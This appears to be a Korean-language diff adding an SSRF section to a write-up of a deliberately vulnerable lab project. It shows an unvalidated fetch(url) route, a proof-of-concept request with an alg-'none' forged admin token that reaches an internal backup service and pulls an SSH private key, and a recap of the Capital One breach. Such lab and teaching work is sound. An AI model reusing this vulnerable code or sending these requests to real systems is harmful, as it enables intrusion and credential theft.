@@ -132,10 +132,90 @@ def download():
 - path 파라미터에 대한 검증이 없기 때문에 공격자는 임의의 파일 경로를 지정하여 서비스 내 다른 파일들에 접근할 수 있게 된다.
 - SSRF랑 결합하여 호스트 내부에서만 접근가능했던 해당 서비스에 접근하여 민감한 백업 파일들을 다운로드하도록 시나리오를 설계함 (ex. ssh deploy 키 등등)
 
+## SSRF
 
+```node.js
+// SSRF 취약점: 배너 이미지 미리보기 (URL 검증 없음)
+router.get('/preview', vulnerableJwtMiddleware, checkAdmin, (req, res) => {
+  const { url } = req.query;
+  
+  if (!url || typeof url !== 'string') {
+    return res.status(400).json({ error: 'Missing url parameter' });
+  }
+  fetch(url)
+    .then(response => {
+      // 원본 서비스의 상태 코드와 Content-Type 그대로 전달
+      const contentType = response.headers.get('content-type') || 'application/octet-stream';
+...
 
+    })
+```
+- 배너 이미지 미리보기 기능에서 `url` 파라미터에 대한 검증을 하지 않음
+- `fetch(url)`을 통해 서버가 검증하지 않은 url파라미터에 대한 값으로 요청을 보냄. 
+- 이때, 서버 기준으로 요청을 보내기 때문에, 외부에선 접근 불가한 내부 서비스에 접근이 가능해진다.
 
+## poc
 
+1. 기존엔 접근 불가능한 filtered된 내부 서비스
+![[Pasted image 20260108031050.png]]
 
+2. 배너 이미지 미리보기 기능 발견. 이때, 배너 이미지를 `url`로 서버에서 요청하여 가져오고 있음을 확인
+![[Pasted image 20260108031243.png]]
 
+3. `/preview` api에서 `url`을 조작하여 내부 파일 공유 서비스로 ssrf 요청 보내기 성공
+```
+GET /febf809ab643f5f211905c83ba9f6cf5a2659d81469ec9df1e8ab5ca0390f7a5/preview?url=http://localhost:8080/ HTTP/1.1
+Host: 192.168.200.135
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
+Accept: */*
+Referer: http://192.168.200.135/febf809ab643f5f211905c83ba9f6cf5a2659d81469ec9df1e8ab5ca0390f7a5?url=http%3A%2F%2F192.168.200.135%2Fassets%2Fuploads%2FEnd-of-Semester_Party.png
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+```
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 07 Jan 2026 18:13:58 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+X-Powered-By: Express
+Content-Length: 105
 
+<h1>Club Backup Service</h1>
+<p>Status: Read-only (maintenance)</p>
+<p>Endpoints: /upload, /download</p>
+```
+
+4. 마지막으로, `/download` 엔드포인트로 ssrf 요청하여 ssh 개인키 탈취에 성공하게 된다.
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 07 Jan 2026 18:21:53 GMT
+Content-Type: application/octet-stream
+Content-Length: 399
+Connection: close
+X-Powered-By: Express
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+```
+
+## SSRF 1-day
+
+> capital one 공격 시나리오: 2019년 SSRF 공격으로 인해 미국 금융 기관 ‘캐피탈 원(Capital One)’에서 미국과 캐나다에 걸쳐 약 1억 600만 명의 해킹 피해자가 생기는 사건이 발생하였다.
+
+> [!note]
+> 프로젝트에서는 캐피탈 one 사례에서 공격자가 AWS에 접근할 수 있는 AccessKey와 Token의 자격증명을 성공적으로 탈취한 것과 유사하게, host유저의 ssh 개인키를 ssrf로 탈취하여 초기침투를 진행하도록 유도하였다.
+
+![[Pasted image 20260108031510.png]]
+- 공격자는 CapitalOne의 홈페이지에 로그인 후 자신의 신용카드 이미지를 본인이 원하는 이미지로 변경할 수 있는 페이지에 접근
+- 이때, 신용카드 이미지를 변경했을 때 URL에 AWS S3 버킷 관련 입력 매개변수가 전달되고 있음을 확인
+- AWS S3 버킷 링크를 전달하는 `url` 변수에 공격자는 외부 이미지 리소스의 URL 주소를 삽입하였고 해당 이미지가 로드되어 카드 이미지에 적용된 것을 확인.
+- 이를 통해 공격자는 해당 변수에 SSRF 취약점이 존재하고 있고 AWS 클라우드를 사용하고 있음을 알아내어 공격하였다.
+
+**취약 코드**
+![[Pasted image 20260108031655.png]]
+- queryString 변수에서 S3 버킷 URL을 `url=` 변수에 할당 후 `storageService.load` 기능을 이용, `url` 매개 변수를 통해 S3 버킷에서 미리 보기 이미지를 다운로드하게 된다. 
+- 마지막으로 `HttpGet` 함수를 이용, 이미지 파일 검색을 위해 Java 기능을 호출하는데 여기서 `url`에 대한 사용자 입력 값 유효성 검사가 이루어지지 않고 있어 SSRF 취약점이 발생하였다.
